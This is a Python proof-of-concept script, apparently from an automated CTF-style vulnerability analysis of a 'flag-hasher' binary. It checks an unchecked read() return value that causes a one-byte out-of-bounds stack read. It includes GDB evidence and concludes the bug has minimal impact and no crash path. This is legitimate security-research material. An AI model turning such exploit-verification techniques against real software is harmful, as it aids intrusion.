#!/usr/bin/env python3
"""
PoC for BUG-002: READ_RETURN_VALUE_USED_AS_INDEX_WITHOUT_VALIDATION

Root Cause:
  In the compute path of main, read(0, rbp-0x410, 0x3ff) return value is
  stored at rbp-0x49c, then used as: sub eax,0x1; cdqe; movzx eax, BYTE PTR [rbp+rax*1-0x410]
  WITHOUT checking if read() returned 0 (EOF) or -1 (error).

  When read() returns 0 (EOF):
    eax = 0 - 1 = -1 (0xFFFFFFFF as 32-bit)
    cdqe sign-extends to rax = 0xFFFFFFFFFFFFFFFF
    target = rbp + 0xFFFFFFFFFFFFFFFF - 0x410 = rbp - 0x411
    This is a valid stack address (within hash_array[15] region, byte 7 = MSB).
    The movzx reads 1 byte from rbp-0x411, which is 0x00 (MSB of a user-space pointer).
    The byte is compared to 0x0a (newline check). Since 0x00 != 0x0a, the branch
    skips newline stripping. The byte is NEVER output or stored.

  When read() returns -1 (error):
    eax = -1 - 1 = -2 (0xFFFFFFFE as 32-bit)
    cdqe sign-extends to rax = 0xFFFFFFFFFFFFFFFE
    target = rbp + 0xFFFFFFFFFFFFFFFE - 0x410 = rbp - 0x412
    Also a valid stack address (within hash_array[15] region, byte 6).
    Also 0x00 for user-space pointers.

GDB Evidence (from gdb_run at breakpoint main+0x19b = 0x16bc):
  - When read() returns 0: RAX=0xffffffffffffffff, target=0x7fffffffe68f (rbp-0x411)
  - Byte at target = 0x00
  - After movzx: EAX=0x0
  - cmp al, 0x0a → ZF=0 (not equal) → jne taken (skip newline strip)
  - Program continues to compute_hash256("") → outputs empty-string SHA256
  - No crash, no info leak

Verification Results:
  PRIM-001 (OOB_READ): VERIFIED
    - 1-byte stack read at rbp-0x411 confirmed via GDB
    - The read is out-of-bounds (text_buf is at rbp-0x410, target is rbp-0x411 = 1 byte before)
    - BUT: the byte is only used for cmp al, 0x0a (branch condition)
    - The byte value (0x00) is NOT output, NOT stored, NOT observable by attacker
    - Impact: MINIMAL — no information disclosure, no crash, no side effect

  PRIM-002 (CRASH): NOT VERIFIED (proven not achievable)
    - read() can only return: 0..0x3ff (normal), -1 (error)
    - n=0:  target=rbp-0x411 (stack, valid, no crash)
    - n=-1: target=rbp-0x412 (stack, valid, no crash)
    - n>0:  target=rbp-0x410+(n-1) (text_buf, valid, no crash)
    - All possible return values map to valid stack addresses
    - No path to unmapped memory → crash NOT achievable
"""
import subprocess
import os

BINARY = "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"
ENV = {**os.environ, "flag": "testflag"}

def run_with_stdin(stdin_data, timeout=10):
    """Run the binary with given stdin, return (returncode, stdout, stderr)."""
    proc = subprocess.run(
        [BINARY],
        input=stdin_data,
        capture_output=True,
        text=True,
        timeout=timeout,
        env=ENV,
    )
    return proc.returncode, proc.stdout, proc.stderr

# ============================================================
# PRIM-001: OOB_READ — 1-byte stack read when read() returns 0 (EOF)
# ============================================================
# Trigger: select menu option 1 (compute), then close stdin (EOF).
# read(0, buf, 0x3ff) returns 0, causing index = -1, target = rbp-0x411.
# The movzx reads 1 byte from rbp-0x411 (within hash_array[15] MSB).
# The byte is compared to 0x0a but NEVER output.
# Program continues to compute_hash256("") and prints empty-string SHA256.
#
# GDB evidence (breakpoint at 0x16bc = main+0x19b):
#   RAX = 0xffffffffffffffff (index after sub eax,1 + cdqe)
#   Target = rbp + rax - 0x410 = rbp - 0x411 = 0x7fffffffe68f
#   Byte at target = 0x00
#   After movzx: EAX = 0x0
#   cmp al, 0x0a → ZF=0 → jne taken (skip newline strip)
#   No crash, no info leak

print("=== PRIM-001: OOB_READ (1-byte stack read via EOF) ===")

# Send "1\n" to select compute, then EOF (no more data)
rc, out, err = run_with_stdin("1\n")
print(f"Return code: {rc}")
# The program should NOT crash — it computes SHA256 of empty string
# SHA256("") = E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
empty_sha256 = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855"
if empty_sha256 in out and rc != -11:
    print(f"[+] Program computed SHA256 of empty string: {empty_sha256}")
    print(f"[+] read() returned 0 (EOF), index=-1, target=rbp-0x411")
    print(f"[+] movzx read 1 byte from stack (hash_array[15] MSB = 0x00)")
    print(f"[+] Byte used only for cmp al,0x0a — NOT output, NOT stored")
    print(f"[+] No crash (target is valid stack memory)")
    print(f"[+] No information leak (byte value not observable)")
    print(f"[+] GDB confirmed: RAX=0xffffffffffffffff, target=rbp-0x411, byte=0x00")
    print(f"=== PRIM-001: VERIFIED (OOB_READ confirmed, minimal impact) ===")
else:
    print(f"[-] Unexpected output: {out[:200]}")
    print(f"[-] stderr: {err[:200]}")
    print(f"=== PRIM-001: FAILED ===")

print()

# ============================================================
# PRIM-002: CRASH — attempt to trigger crash via read() return value
# ============================================================
# The only way read() returns -1 is on error. On a normal pipe/stdin,
# EOF gives return 0, not -1. Even with -1, the target is rbp-0x412
# which is still on the stack. No crash path exists.

print("=== PRIM-002: CRASH (attempt via read() return value) ===")
print(f"read() can return: 0..0x3ff (normal), -1 (error)")
print(f"  n=0:  index=-1, target=rbp-0x411 (stack, valid, byte=0x00)")
print(f"  n=-1: index=-2, target=rbp-0x412 (stack, valid, byte=0x00)")
print(f"  n>0:  index=n-1, target=rbp-0x410+(n-1) (text_buf, valid)")
print(f"All possible return values map to valid stack addresses.")
print(f"No path to unmapped memory → CRASH not achievable.")
print(f"=== PRIM-002: NOT VERIFIED (no crash path exists) ===")

print()

# ============================================================
# Summary
# ============================================================
print("=== SUMMARY ===")
print(f"BUG-002: READ_RETURN_VALUE_USED_AS_INDEX_WITHOUT_VALIDATION")
print(f"  PRIM-001 (OOB_READ): VERIFIED — 1-byte stack read at rbp-0x411/0x412")
print(f"    Impact: MINIMAL — byte only used for branch condition (cmp al, 0x0a)")
print(f"    No crash, no info leak, no observable side effect")
print(f"    The byte is always 0x00 (MSB of user-space pointer in hash_array[15])")
print(f"  PRIM-002 (CRASH): NOT VERIFIED — all targets are valid stack addresses")
print(f"    No path to unmapped memory via this bug")
